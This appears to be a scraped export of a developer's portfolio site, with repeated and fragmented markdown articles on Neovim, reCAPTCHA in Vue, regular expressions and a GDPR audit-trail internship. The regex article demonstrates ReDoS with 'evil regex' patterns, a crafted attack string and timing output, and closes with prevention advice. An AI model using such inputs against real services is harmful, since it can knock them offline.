accidentally, or maybe you spend some time in the extensive help files.\n\nThe hardest thing is all the key combinations possible within vim. \n\nThis can be very overwhelming but it is not at all necessary to learn all the key combinations at once with as many as 10 combinations you can use all of vim already!\n\nOnce you are in the eqos system of vim there is no going back just like apple. \n\n## What is Neovim?\n\nButtt..... let's bring neovim in to the picture \n\nNeovim is a community-driven open source project and a fork of the Vim text editor designed to make Vim's core developers' lives simpler. It's an upgraded Vim text editor out of the box, or to put it another way, it's a more streamlined Vim that makes integrations lot easier than Vim. Vim is already the most popular text editor and the text editor of choice for programmers. Consider Neovim to be the Vim editor of the future, aiming to remedy some of the shortcomings of its predecessor. For one thing, building plug-ins proved difficult, and Vim isn't well-suited to current systems. So, Neovim fixes the issues you were having with Vim. Neovim improves on Vim by providing a totally redesigned plug-in architecture, a better GUI ecosystem, first-class embedding support, and more.\n\nDuring my introduction to neovim I found out that neovim and the community were in transition this made the learning process super convenient. This transition took place through the introduction of lua files. A lua file contains [source code](https://techterms.com/definition/sourcecode) written in Lua, a light-weight programming language designed for extending or adding functionality to software applications. The Lua scripting language [syntax](https://techterms.com/definition/syntax) is simple but supports a large number of [data types](https://techterms.com/definition/datatype) and operators. Lua is very weel integrated with Neovim, and with LuaJIT, it is much faster than vimscript. If you, like me, never really understood Vimscript and hate the language with a passion because like I told before its really difficult to integrate. \n\nLet's talk about lua files.\n\nLet's take the following folder structure as an example:\n\n``` \n📂 ~/.config/nvim\n├── 📁 plugins\n├── 📂 lua\n│  └── 📂 setup_plugins\n|  ├── 🌑 plugin_manager.lua\n|  ├── 🌑 mappings.lua\n│  └── 🌑 settings.lua\n└── 🇻 init.lua (or) init.vim\n```\n\nnvim has no fixed folder structure but I personally find this the most logical structure for my needs. My init file is my main file as with many languages it is the starting point. From here I put references to different sub folders that all have their own domain.\n\nIn my settings I set all preferences like font type colors but also tab spacing.

That many people can't be wrong, right? Vim is a  free open source software. My first experience with Vim was when I accidentally entered it and could not get out. I had to google [how to exit vim](https://stackoverflow.com/questions/11828270/how-do-i-exit-the-vim-editor) to escape. I asked, *\"why would anyone ever use this awful editor?\"* Fast forward 4 years, this awful editor is now my primary editor. I've tried editors like *Notepad++, Atom, Intellij and VSCode*\n\nThis semester enabled me to make the switch to this environment. This did not work out last semester because there is a very intensive learning curve to learning vim. \n\nI think a great editor needs to have these three features:\n\n- Extensibility\n- Community\n- Composability\n- Intelligent code completion\n\nVim is what I use because it has all four of the capabilities listed above. Allow me to explain each one.\n\n## Extensibility\n\nIf you've used VSCode, Atom, or Sublime, then you know being able to add and remove plugins easily is an indispensable feature. This functionality is also provided by vim but that's not all because vim allows you to choose your own plugin manager according to your needs. In my environment I use packer. \n\n## Community\n\nIn open source technology, the community is very crucial. As long as there are enough contributing developers, a vibrant community assures continual development and problem fixes. More community plugins, tutorials, and human help are all part of the equation. The Vim community is quite active. It has a reddit page, a stackexchange account, and a number of specialized twitter accounts, among other things. I personally learned a lot from the vim master ThePrimeagen on youtube and twitch.\n\n## Composability\n\nIn addition to extensibility and community, Vim features composability, which I believe is a trait that many non-modal editors lack.\n\nCompo..what?\n\nComposability refers to the ability to combine a set of generic instructions to achieve more complicated tasks. In the same way that you can make complicated abstractions out of smaller abstractions in programming, you can run complex commands out of simpler ones in Vim. Vim contains movement motions and editing operators (there are also text objects, but I won't go over them here).\n\n## Intelligent code completion\n\nIntelligent code completion is a context-aware code completion function in various programming environments that reduces typos and other typical errors to speed up the writing process. Attempts at this are often made by using auto-completion popups while typing, querying function arguments, and query tips for syntax mistakes. Reflection is used to provide documentation and disambiguation for variable names, functions, and methods utilizing intelligent code completion and associated technologies. also for this complexity, vim has several plugins that can support you with this. \n\n# Learning curve\n\nit's not a curve it's a wall, but if you break it you'll earn your geekhood!\n\nIf you use vim all day and make an effort to use it well, you’ll be editing code faster than you did in your old editor within two weeks. Learning vim is like this. At first, you do everything as simply as possible. Then you start to wonder if there are faster ways to get things done, and there are! If you chain those commands together they just work! You bump into things accidentally, or maybe you spend some time in the extensive help files.\n\nThe hardest thing is all the key combinations possible within vim. \n\nThis can be very overwhelming but it is not at all necessary to learn all the key combinations at once with as many as 10 combinations you can use all of vim already!\n\nOnce you are in the eqos system of vim there is no going back just like apple. \n\n## What is Neovim?\n\nButtt..... let's bring neovim in to the picture \n\nNeovim is a community-driven open source project and a fork of the Vim text editor designed to make Vim's core developers' lives simpler. It's an upgraded Vim text editor out of the box, or to put it another way, it's a more streamlined Vim that makes integrations lot easier than Vim. Vim is already the most popular text editor and the text editor of choice for programmers. Consider Neovim to be the Vim editor of the future, aiming to remedy some of the shortcomings of its predecessor. For one thing, building plug-ins proved difficult, and Vim isn't well-suited to current systems. So, Neovim fixes the issues you were having with Vim. Neovim improves on Vim by providing a totally redesigned plug-in architecture, a better GUI ecosystem, first-class embedding support, and more.\n\nDuring my introduction to neovim I found out that neovim and the community were in transition this made the learning process super convenient. This transition took place through the introduction of lua files. A lua file contains [source code](https://techterms.com/definition/sourcecode) written in Lua, a light-weight programming language designed for extending or adding functionality to software applications. The Lua scripting language [syntax](https://techterms.com/definition/syntax) is simple but supports a large number of [data types](https://techterms.com/definition/datatype) and operators. Lua is very weel integrated with Neovim, and with LuaJIT, it is much faster than vimscript. If you, like me, never really understood Vimscript and hate the language with a passion because like I told before its really difficult to integrate. \n\nLet's talk about lua files.\n\nLet's take the following folder structure as an example:\n\n``` \n📂 ~/.config/nvim\n├── 📁 plugins\n├── 📂 lua\n│  └── 📂 setup_plugins\n|  ├── 🌑 plugin_manager.lua\n|  ├── 🌑 mappings.lua\n│  └── 🌑 settings.lua\n└── 🇻 init.lua (or) init.vim\n```\n\nnvim has no fixed folder structure but I personally find this the most logical structure for my needs. My init file is my main file as with many languages it is the starting point. From here I put references to different sub folders that all have their own domain.\n\nIn my settings I set all preferences like font type colors but also tab spacing. My plugin manager is the place where I indicate which plugins I would like to use within my environment. my mapping allows me to create different keybindings.  \n\nThere are still an awful lot of things you can make especially with the integration with lua files, but I'm not working on this at the moment. \n\nBelow is a link pointing to my .dotfiles containing my configuration of nvim. \n\n[.config/nvim](https://github.com/rikp777/.dotfiles/tree/master/nvim/.config/nvim)\n\n## How I started:\n\nMy learning process began with configuring a my own vim script.

The answer is actually quite simple: you have to prove that you are a human being!\n\nScripts, which we also call bots or robots, are constantly scouring the Internet. Some of them provide information about a website to a search engine. But there are also bots that look for forms and fill them automatically with all kinds of garbage.\n\nTo prevent this robot/bot from simply clicking the submit button, a captcha is placed in the middle. This must first be completed correctly before the form can be submitted.\n\nSome examples of when to use a Captcha:\n\n- **Maintaining poll accuracy**\n- **Limiting registration for services**\n- **Preventing ticket inflation**\n- **Preventing false comments**\n\nCAPTCHA stands for: \n\n\"Completely Automated Public Turing test to tell Computers and Humans Apart.\"\n\n## Types\n\nThere are several captchas that can be implemented now a day such as:\n\n### reCAPTCHA v3\n\nreCAPTCHA v3 allows you to verify if an interaction is legitimate without any user interaction. It is a pure JavaScript API returning a score, giving you the ability to take action in the context of your site: for instance requiring additional factors of authentication, sending a post to moderation, or throttling bots that may be scraping content.\n\n### reCAPTCHA (v2)\n\n#### Visible \n\nThe \"I'm not a robot\" Checkbox requires the user to click a checkbox indicating the user is not a robot. This will either pass the user immediately (with No CAPTCHA) or challenge them to validate whether or not they are human. This is the simplest option to integrate with and only requires two lines of HTML to render the checkbox.\n\n#### Invisible \n\nThe invisible reCAPTCHA badge does not require the user to click on a checkbox, instead it is invoked directly when the user clicks on an existing button on your site or can be invoked via a JavaScript API call. The integration requires a JavaScript callback when reCAPTCHA verification is complete. By default only the most suspicious traffic will be prompted to solve a captcha. To alter this behavior edit your site security preference under advanced settings.\n\n### Visual captchas (v1)\n\nIn many cases the captchas are based on text, number combinations and characters that are difficult to recognize. A capcha is build a way that one user will never get the same captcha twice. There are also captchas that ask the user questions there are multiple types of question but most of them are based on image recognition. For example click all taxi's in the box below. Some characteristics are:\n\n- Letters and numbers are usually not nicely juxtaposed, but scattered across the screen.\n- The characters are not nicely straight, but rotated.\n- Different fonts (typefaces) are used.\n- A background image or different colors are used; almost never 1 color.\n\nv1 is not supported anymore since 2018 despite that many site still have this implementation. This implementation of captchas also ranked as most irritating among people. That's why there are new versions today that thoroughly address this problem.\n\n## Implementation \n\nThe first step is the simplest. Go to the [reCAPTCHA homepage ](https://www.google.com/recaptcha/intro/index.html)and click on the *Get reCAPTCHA* button at the top of the screen. On the next screen, you’ll find a prompt to enter a label and domain for your site, so you can identify it among your reCAPTCHA properties.\n\nPopulate both fields, click on *Register*, and you’re done. On the next screen, you’ll receive both a *Site Key* and a *Secret Key*.\n\n\n\n#### Front-end\n\nTo use reCaptcha I followed the documentation steps, but with the help of a package from yarn to vue, **vue-recaptcha**, which provides me with a basically ready component, just implement it and capture the event from validation you can see more about it\n\n##### Instalation\n\nyarn add vue-recaptcha-v3\nyarn add axios\n\nIn my **app.js** where I store my environment variables I will set the site key and url of my api, which in this case will be running on localhost\n\n```javascript\nimport Vue from 'vue'\nimport { VueReCaptcha } from 'vue-recaptcha-v3'\n\nVue.use(VueReCaptcha, { siteKey: '<site key>' })\n\nnew Vue({\n  methods: {\n    async recaptcha() {\n      // (optional) Wait until recaptcha has been loaded.\n      await this.$recaptchaLoaded()\n\n      // Execute reCAPTCHA with action \"login\".\n      const token = await this.$recaptcha('login')\n\n      // Do stuff with the received token.\n      console.log(token) // Will print the token\n    }\n  },\n  template: '<button @click=\"recaptcha\">Execute recaptcha</button>'\n})\n```\n\nEach reCAPTCHA user response token is valid for two minutes, and can only be verified *once* to prevent replay attacks. If you need a new token, you can re-run the reCAPTCHA verification.\n\nAfter you get the response token, you need to verify it within two minutes with reCAPTCHA using the following API to ensure the token is valid.\n\n##### API Request\n\nURL: https://www.google.com/recaptcha/api/siteverify \t\t\t\tMETHOD: POST\n\n| OST Parameter | Description                                                  |\n| :------------ | :----------------------------------------------------------- |\n| secret        | Required. The shared key between your site and reCAPTCHA.    |\n| response      | Required. The user response token provided by the reCAPTCHA client-side integration on your site. |\n| remoteip      | Optional. The user's IP address.                             |\n\n##### API Response \n\nThe response is a JSON object:\n\n```json\n{\n  \"success\": true|false,\n  \"challenge_ts\": timestamp,  // timestamp of the challenge load (ISO format yyyy-MM-dd'T'HH:mm:ssZZ)\n  \"hostname\": string,         // the hostname of the site where the reCAPTCHA was solved\n  \"error-codes\": [...]        // optional\n}\n```\n\n\n\nDespite being under constant attack, CAPTCHAs remain a [wildly popular](https://trends.builtwith.com/widgets/captcha) method of protection for websites. They’re definitely not the [only defense](http://www.creativebloq.com/web-design/website-security-tips-protect-your-site-7122853) you can implement, but they are one of the simplest and most efficient.\n\n# Evaluation \n\nI have come to know a lot about captcha for example i did not know that there were already newer versions available that eliminates the need to manually enter characters.

Why does the owner of the site want you to fill in such a captcha? The answer is actually quite simple: you have to prove that you are a human being!\n\nScripts, which we also call bots or robots, are constantly scouring the Internet. Some of them provide information about a website to a search engine. But there are also bots that look for forms and fill them automatically with all kinds of garbage.\n\nTo prevent this robot/bot from simply clicking the submit button, a captcha is placed in the middle. This must first be completed correctly before the form can be submitted.\n\nSome examples of when to use a Captcha:\n\n- **Maintaining poll accuracy**\n- **Limiting registration for services**\n- **Preventing ticket inflation**\n- **Preventing false comments**\n\nCAPTCHA stands for: \n\n\"Completely Automated Public Turing test to tell Computers and Humans Apart.\"\n\n## Types\n\nThere are several captchas that can be implemented now a day such as:\n\n### reCAPTCHA v3\n\nreCAPTCHA v3 allows you to verify if an interaction is legitimate without any user interaction. It is a pure JavaScript API returning a score, giving you the ability to take action in the context of your site: for instance requiring additional factors of authentication, sending a post to moderation, or throttling bots that may be scraping content.\n\n### reCAPTCHA (v2)\n\n#### Visible \n\nThe \"I'm not a robot\" Checkbox requires the user to click a checkbox indicating the user is not a robot. This will either pass the user immediately (with No CAPTCHA) or challenge them to validate whether or not they are human. This is the simplest option to integrate with and only requires two lines of HTML to render the checkbox.\n\n#### Invisible \n\nThe invisible reCAPTCHA badge does not require the user to click on a checkbox, instead it is invoked directly when the user clicks on an existing button on your site or can be invoked via a JavaScript API call. The integration requires a JavaScript callback when reCAPTCHA verification is complete. By default only the most suspicious traffic will be prompted to solve a captcha. To alter this behavior edit your site security preference under advanced settings.\n\n### Visual captchas (v1)\n\nIn many cases the captchas are based on text, number combinations and characters that are difficult to recognize. A capcha is build a way that one user will never get the same captcha twice. There are also captchas that ask the user questions there are multiple types of question but most of them are based on image recognition. For example click all taxi's in the box below. Some characteristics are:\n\n- Letters and numbers are usually not nicely juxtaposed, but scattered across the screen.\n- The characters are not nicely straight, but rotated.\n- Different fonts (typefaces) are used.\n- A background image or different colors are used; almost never 1 color.\n\nv1 is not supported anymore since 2018 despite that many site still have this implementation. This implementation of captchas also ranked as most irritating among people. That's why there are new versions today that thoroughly address this problem.\n\n## Implementation \n\nThe first step is the simplest. Go to the [reCAPTCHA homepage ](https://www.google.com/recaptcha/intro/index.html)and click on the *Get reCAPTCHA* button at the top of the screen. On the next screen, you’ll find a prompt to enter a label and domain for your site, so you can identify it among your reCAPTCHA properties.\n\nPopulate both fields, click on *Register*, and you’re done. On the next screen, you’ll receive both a *Site Key* and a *Secret Key*.\n\n\n\n#### Front-end\n\nTo use reCaptcha I followed the documentation steps, but with the help of a package from yarn to vue, **vue-recaptcha**, which provides me with a basically ready component, just implement it and capture the event from validation you can see more about it\n\n##### Instalation\n\nyarn add vue-recaptcha-v3\nyarn add axios\n\nIn my **app.js** where I store my environment variables I will set the site key and url of my api, which in this case will be running on localhost\n\n```javascript\nimport Vue from 'vue'\nimport { VueReCaptcha } from 'vue-recaptcha-v3'\n\nVue.use(VueReCaptcha, { siteKey: '<site key>' })\n\nnew Vue({\n  methods: {\n    async recaptcha() {\n      // (optional) Wait until recaptcha has been loaded.\n      await this.$recaptchaLoaded()\n\n      // Execute reCAPTCHA with action \"login\".\n      const token = await this.$recaptcha('login')\n\n      // Do stuff with the received token.\n      console.log(token) // Will print the token\n    }\n  },\n  template: '<button @click=\"recaptcha\">Execute recaptcha</button>'\n})\n```\n\nEach reCAPTCHA user response token is valid for two minutes, and can only be verified *once* to prevent replay attacks. If you need a new token, you can re-run the reCAPTCHA verification.\n\nAfter you get the response token, you need to verify it within two minutes with reCAPTCHA using the following API to ensure the token is valid.\n\n##### API Request\n\nURL: https://www.google.com/recaptcha/api/siteverify \t\t\t\tMETHOD: POST\n\n| OST Parameter | Description                                                  |\n| :------------ | :----------------------------------------------------------- |\n| secret        | Required. The shared key between your site and reCAPTCHA.    |\n| response      | Required. The user response token provided by the reCAPTCHA client-side integration on your site. |\n| remoteip      | Optional. The user's IP address.                             |\n\n##### API Response \n\nThe response is a JSON object:\n\n```json\n{\n  \"success\": true|false,\n  \"challenge_ts\": timestamp,  // timestamp of the challenge load (ISO format yyyy-MM-dd'T'HH:mm:ssZZ)\n  \"hostname\": string,         // the hostname of the site where the reCAPTCHA was solved\n  \"error-codes\": [...]        // optional\n}\n```\n\n\n\nDespite being under constant attack, CAPTCHAs remain a [wildly popular](https://trends.builtwith.com/widgets/captcha) method of protection for websites. They’re definitely not the [only defense](http://www.creativebloq.com/web-design/website-security-tips-protect-your-site-7122853) you can implement, but they are one of the simplest and most efficient.\n\n# Evaluation \n\nI have come to know a lot about captcha for example i did not know that there were already newer versions available that eliminates the need to manually enter characters. This makes it much easier for the user and prevents Irritations especially with me personally.

Almost all big programming languages such as Java, C# have them embedded in their language. \n\nBut before we go deeper in to the topic you first need to understand what a regular expression ( regex) is. Regex  is a character set witch describes certain patterns its is mostly used to match and locate text in a string. \n\nA regular expressions is a way to describe patterns. A computer can recognize these regular expressions and will be able to recognize text inside for example a document. You can for example use a regular expression to search through a text or check if an email-address is correctly formatted.\n\nThere are a lot of character used in a regular expression and it can be unreadable to the untrained eye.\n\n## Cheat sheet summary \n\nTo make a regex yourself you need to understand the list below. in doing so you have to understand what each character means and does. \n\n| Character   | Description |\n|-------------|-------------|\n| \\           | the escape character - used to find an instance of a meta character like a period, brackets, etc. |\n| .           | match any character except newline |\n| x           | match any instance of x |\n| ^x          | match any character except x |\n| [x]         | match any instance of x in the bracketed range - [abxyz] will match any instance of a, b, x, y, or z|\n| \\|           | an OR operator - [xꟾy] will match an instance of x or y |\n| () | used to group sequences of characters or matches |\n| {} | used to define numeric quantifiers |\n| {x} | match must occur exactly x times |\n| {x,} | match must occur at least x times |\n| {x,y} | match must occur at least x times, but no more than y times |\n| ? | preceding match is optional or one only, same as {0,1} |\n| * | find 0 or more of preceding match, same as {0,} |\n| + | find 1 or more of preceding match, same as {1,} |\n| ^ | match the beginning of the line |\n| $ | match the end of a line |\n|  |  |\n| [:alpha:] | Represents an alphabetic character.

But you must be able to understand what is being performed in such an expression.\n\n# Cyber \n\n## Denial of service attack (ReDoS)\n\nA denial of service attack is when an attacker makes an online service slow down or become unavailable to its users. \n\nDenial-of-service for regular expressions (ReDoS) is a denial-of-service attack that takes advantage of the fact that most implementations of regular expressions can get into extreme situations that make them work very slowly (exponentially depending on the input size). An attacker can use a [stripped down] regular expression to get a program into these extreme situations and then get stuck for a long time. \n\n### Evil Regex\n\nA regex pattern is known as a evil regex if it can get stuck in the generated input that is given.\n\nEvil regex contains :\n\n- Grouping with a lot of repetition\n- Inside of repetition group \n  - Again repetition (many nested repertitions)\n  - Alternation with overlapping\n\nsome examples \n\n- ```regex\n  ^(a+)+$\n  ```\n\n- ```regex\n  ([a-zA-Z]+)*\n  ```\n\n- ```regex\n  (a|aa)+\n  ```\n\n- ```regex\n  (a|a?)+\n  ```\n\n- ```regex\n  (.*a){x} for x \\> 10\n  ```\n\n- ``` regex\n  \\^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ \n  ```\n\n\nThese regex expressions are all sensitive to the string input:\n- \t\t\taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\n\n```javascript\nvar validUrlRegex = /^(https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\/\\w \\.-]*)*\\/?$/\nvar url = 'https://google.com/'\n\nconsole.time('regex evaluation time')\n\nif (url.match(validUrlRegex)) {\n  console.log(url + ' is a valid url')\n} else {\n  console.log(url + ' is not a valid url')\n}\n\nconsole.timeEnd('regex evaluation time')\n```\n\nThe output should be:\n\n```text\nhttps://google.com/ is a valid url\nregex evaluation time: 2ms\n```\n\nBut now consider to apply the regular expression on a bad url introduced in our code by an attacker.\n\n```javascript\nvar validUrlRegex = /^(https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\/\\w \\.-]*)*\\/?$/\nvar badUrl = 'https://google.com/aaaaaaaaaaaaaaaaaaaaaaaa@'\n\nconsole.time('regex evaluation time')\n\nif (badUrl.match(validUrlRegex)) {\n  console.log(badUrl + ' is a valid url')\n} else {\n  console.log(badUrl + ' is not a valid url')\n}\n\nconsole.timeEnd('regex evaluation time')\n```\n\nOutput:\n\n```text\nhttps://google.com/aaaaaaaaaaaaaaaaaaaaaaaa@ is not a valid url\nregex evaluation time: 2196ms\n```\n\nAs you can observe, the evaluation time of regex has been increased by 1000 times by adding only 25 characters to previous url. Let's see why.\n\n__Fair warning, I actually managed to crash my computer when trying this out by giving a super long string as input._\n\n### The attack \n\n\n\n### Prevent This Vulnerability\n\nRecognizing evil regular expressions requires in-depth knowledge / experience with them. There are also tools to recognize these types of regular expressions. As a software-engineer you have to be vary careful when applying regular expressions in your code. Always have a limit on how many characters to accept from a input. Or use standard libraries to check certain expressions. \"Sanitize and filter user's inputs\" this is a rule valid also for other type of attacks. Since the attack can be originated from a input string, filter and sanitize it before to evaluate it to avoid unhandled errors or attacks.\n\n","dir":"/projects/software-engineering","path":"/projects/software-engineering/regular-expressions","extension":".md","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"\n# Regular expressions\n\nRegular expressions are one of the most used programming functions.

But you must be able to understand what is being performed in such an expression.\n\n# Cyber \n\n## Denial of service attack (ReDoS)\n\nA denial of service attack is when an attacker makes an online service slow down or become unavailable to its users. \n\nDenial-of-service for regular expressions (ReDoS) is a denial-of-service attack that takes advantage of the fact that most implementations of regular expressions can get into extreme situations that make them work very slowly (exponentially depending on the input size). An attacker can use a [stripped down] regular expression to get a program into these extreme situations and then get stuck for a long time. \n\n### Evil Regex\n\nA regex pattern is known as a evil regex if it can get stuck in the generated input that is given.\n\nEvil regex contains :\n\n- Grouping with a lot of repetition\n- Inside of repetition group \n  - Again repetition (many nested repertitions)\n  - Alternation with overlapping\n\nsome examples \n\n- ```regex\n  ^(a+)+$\n  ```\n\n- ```regex\n  ([a-zA-Z]+)*\n  ```\n\n- ```regex\n  (a|aa)+\n  ```\n\n- ```regex\n  (a|a?)+\n  ```\n\n- ```regex\n  (.*a){x} for x \\> 10\n  ```\n\n- ``` regex\n  \\^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ \n  ```\n\n\nThese regex expressions are all sensitive to the string input:\n- \t\t\taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\n\n```javascript\nvar validUrlRegex = /^(https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\/\\w \\.-]*)*\\/?$/\nvar url = 'https://google.com/'\n\nconsole.time('regex evaluation time')\n\nif (url.match(validUrlRegex)) {\n  console.log(url + ' is a valid url')\n} else {\n  console.log(url + ' is not a valid url')\n}\n\nconsole.timeEnd('regex evaluation time')\n```\n\nThe output should be:\n\n```text\nhttps://google.com/ is a valid url\nregex evaluation time: 2ms\n```\n\nBut now consider to apply the regular expression on a bad url introduced in our code by an attacker.\n\n```javascript\nvar validUrlRegex = /^(https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\/\\w \\.-]*)*\\/?$/\nvar badUrl = 'https://google.com/aaaaaaaaaaaaaaaaaaaaaaaa@'\n\nconsole.time('regex evaluation time')\n\nif (badUrl.match(validUrlRegex)) {\n  console.log(badUrl + ' is a valid url')\n} else {\n  console.log(badUrl + ' is not a valid url')\n}\n\nconsole.timeEnd('regex evaluation time')\n```\n\nOutput:\n\n```text\nhttps://google.com/aaaaaaaaaaaaaaaaaaaaaaaa@ is not a valid url\nregex evaluation time: 2196ms\n```\n\nAs you can observe, the evaluation time of regex has been increased by 1000 times by adding only 25 characters to previous url. Let's see why.\n\n__Fair warning, I actually managed to crash my computer when trying this out by giving a super long string as input._\n\n### The attack \n\n\n\n### Prevent This Vulnerability\n\nRecognizing evil regular expressions requires in-depth knowledge / experience with them. There are also tools to recognize these types of regular expressions. As a software-engineer you have to be vary careful when applying regular expressions in your code. Always have a limit on how many characters to accept from a input. Or use standard libraries to check certain expressions. \"Sanitize and filter user's inputs\" this is a rule valid also for other type of attacks. Since the attack can be originated from a input string, filter and sanitize it before to evaluate it to avoid unhandled errors or attacks.\n\n","readingTime":"7 min read","meta":{"version":0,"revision":0,"created":1642431877526},"$loki":21},{"slug":"internship_cytosmart_gdpr","description":"summary about the implementation of the GDPR-CFR legislation that I have applied within the company CytoSMART.","id":null,"title":"GDPR","duration":"1 day","image":"./images/projects/internship/cytosmart/gdpr.jpg","tech":[{"name":"gdpr"},{"name":"annex 11"}],"category":[{"name":"minor"},{"name":"cyber"},{"name":"body of knowledge"},{"name":"software-engineering"},{"name":"internship"}],"author":{"name":"Rik Peeters","image":"/images/me.jpg","social":{"twitter":"rikp777"}},"createdAt":"2021-06-06T00:00:00.000Z","toc":[{"id":"research","depth":2,"text":"Research"},{"id":"technologies","depth":3,"text":"Technologies"},{"id":"conclusion","depth":2,"text":"Conclusion"},{"id":"evaluation","depth":2,"text":"Evaluation"}],"body":{"type":"root","children":[{"type":"element","tag":"h1","props":{"id":"general-data-protection-regulation-gdpr-and-annex-11"},"children":[{"type":"element","tag":"a","props":{"href":"#general-data-protection-regulation-gdpr-and-annex-11","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"General Data Protection Regulation (GDPR) and Annex 11"}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Annex 11 is the FDA 21 CFR part 11 European equivalent."}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Title 21 Part 11 is the portion of Title 21 of the Code of Federal Regulations that establishes the U.S. Electronic Records and Electronic Signatures (ERES) regulations.

Part 11, as it is commonly referred to, defines the criteria under which electronic records and electronic signatures are considered reliable and equivalent to paper documents.\n\nInternship [@CytoSMART](https://cytosmart.com)\n\nThis report is about the internship I did at CytoSMART.\nCytoSMART is a young company whose aim is to offer products (equipment) for biomedical laboratories in as large a market as possible which is worldwide. This company therefore wants to take into account specific requirements and restrictions associated with sales on the international market as early as the development phase. For the development of equipment and software in the pharmaceutical industry, legislation has been created that sets criteria that a device/software must meet. This legislation is called FDA CFR 21 Part 11.\n\nCytoSMART has hired a total of 3 trainees,  which have been divided into different parts within the processing of the CFR 21 Part 11 legislation. The components are:  the Audit trail, the electronic signatures and the approval flow/user management. My part in this project will be the application of the  ”Audit trail”part, as stated in the FDA requirements CFR 21 Part 11, to the current software. The application must have a setting so that it can function according to the standards as described in legislation CFR 21 Part 11, but this setting must also be able to be turned off. The software had to be developed to be able to switch between these settings, on and off.\n\nThe technology used for the front-end consists of Vue.js with a back-end written in C#(ASP.NET), both of which have been made uniform to this  legislation. Previously, almost nothing had been adapted to the application, so that it would not comply with these guidelines as required by CytoSMART. However, after investigation, it was found that the software still met a number of these requirements.\n\nThe audit trail is incorporated in a visual GUI dashboard that is clear and legible for the user, with various functionalities such as export to a PDF format.  It is also possible to sort on different  levels. These levels can be subdivided into:  ”Company”,  ”User”, ”Entity\" and ”Action”.\n\nThe audit trail has been approved by CytoSMART and will be used in the future by various researchers for cell experiments.

This research question is as follows:\n\n```text \nHow can I accomplish the Audit-Trail within the application, and thus have it meet the requirements of the FDA as stated in CFR b?\n```\n\nTo answer the research question, I explored a few sub-topics in more detail. Important guideline in this, will be the steps that other companies in a similar path have already taken. This is because the aforementioned FDA requirements have been in place for some time. Therefore, I took a closer look at comparable companies that already have access to the market in the United States and already meet the requirements. It is therefore important to gain insight into how these companies have completed the validation process and thus obtained their approval. This therefore leads to the asking of the following questions:\n\nA brief summary of the research topics::\n\n- Implementation companies in the same sector\n- Audit trail structure\n- Efficiency database structure\n- Visualization\n- Form persistence\n- Retention period\n- Prerequisites\n- Whole Flow\n\nTo clarify the research topics, a description has been made for each topic, which zooms in even further.
